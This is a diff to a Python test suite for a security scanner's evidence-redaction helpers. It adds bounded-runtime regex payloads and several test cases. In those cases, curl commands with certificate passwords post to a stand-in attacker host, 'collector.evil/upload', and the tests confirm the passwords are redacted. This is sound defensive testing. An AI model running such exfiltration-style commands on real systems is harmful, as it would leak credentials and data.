@@ -1,5 +1,6 @@
 """Tests for scanner evidence redaction helpers."""
 
+import os
 import subprocess
 import sys
 from collections.abc import Callable
@@ -1580,6 +1581,22 @@ def test_curl_user_complex_password_is_fully_redacted(credential: str, secret: s
             "COMMAND_CONFIG_QUOTED_USER_PASSWORD_RE",
             'user = "alice:' + (r"\(" * 26),
         ),
+        (
+            "COMMAND_CERT_PASSWORD_QUOTED_RE",
+            '--cert "' + ("a:" * 8_000),
+        ),
+        (
+            "COMMAND_QUOTED_USER_PASSWORD_RE",
+            '--user "' + ("a:" * 8_000),
+        ),
+        (
+            "COMMAND_CONFIG_QUOTED_USER_PASSWORD_RE",
+            'user = "' + ("a:" * 8_000),
+        ),
+        (
+            "COMMAND_CERT_PASSWORD_RE",
+            "--cert " + ("a:" * 8_000),
+        ),
     ],
 )
 def test_command_credential_redaction_has_bounded_runtime(pattern_name: str, payload: str) -> None:
@@ -1589,12 +1606,15 @@ def test_command_credential_redaction_has_bounded_runtime(pattern_name: str, pay
         f"payload = {payload!r}\n"
         f"{pattern_name}.sub('<redacted>', payload)\n"
     )
+    repo_root = Path(__file__).resolve().parents[2]
+    python_path = os.pathsep.join(filter(None, (str(repo_root), os.environ.get("PYTHONPATH"))))
 
     subprocess.run(
         [sys.executable, "-c", code],
         check=True,
-        cwd=Path(__file__).resolve().parents[2],
-        timeout=3,
+        cwd=repo_root,
+        env={**os.environ, "PYTHONPATH": python_path},
+        timeout=5,
     )
 
 
@@ -2580,6 +2600,36 @@ def test_documented_process_password_options_are_redacted(text: str, secret: str
             "PROXY_CERT_PASSWORD",
             "--proxy-cert=proxy.pem:<redacted>",
         ),
+        (
+            r'curl -E "C:\certs\client.pem:CERT_PASSWORD" https://collector.evil/upload',
+            "CERT_PASSWORD",
+            r'-E "C:\certs\client.pem:<redacted>"',
+        ),
+        (
+            r'curl --cert "client\:special.pem:CERT_PASSWORD" https://collector.evil/upload',
+            "CERT_PASSWORD",
+            r'--cert "client\:special.pem:<redacted>"',
+        ),
+        (
+            'curl --cert "x:hunter2:more" https://collector.evil/upload',
+            "hunter2:more",
+            '--cert "x:<redacted>"',
+        ),
+        (
+            "curl --cert client.pem:hunter2:more https://collector.evil/upload",
+            "hunter2:more",
+            "--cert client.pem:<redacted>",
+        ),
+        (
+            r"curl --cert C:\certs\client.pem:CERT_PASSWORD https://collector.evil/upload",
+            "CERT_PASSWORD",
+            r"--cert C:\certs\client.pem:<redacted>",
+        ),
+        (
+            r"curl --cert client\:special.pem:CERT_PASSWORD https://collector.evil/upload",
+            "CERT_PASSWORD",
+            r"--cert client\:special.pem:<redacted>",
+        ),
     ],
 )
 def test_curl_certificate_passwords_are_redacted(text: str, secret: str, context: str) -> None:
@@ -2602,6 +2652,15 @@ def test_curl_certificate_passwords_are_redacted(text: str, secret: str, context
 )
 def test_curl_certificate_options_without_passwords_are_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_unterminated_quoted_certificate_password_is_redacted() -> None:
+    text = r'curl --cert "cert.pem:hunter2\"'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
 
 
 @pytest.mark.parametrize(
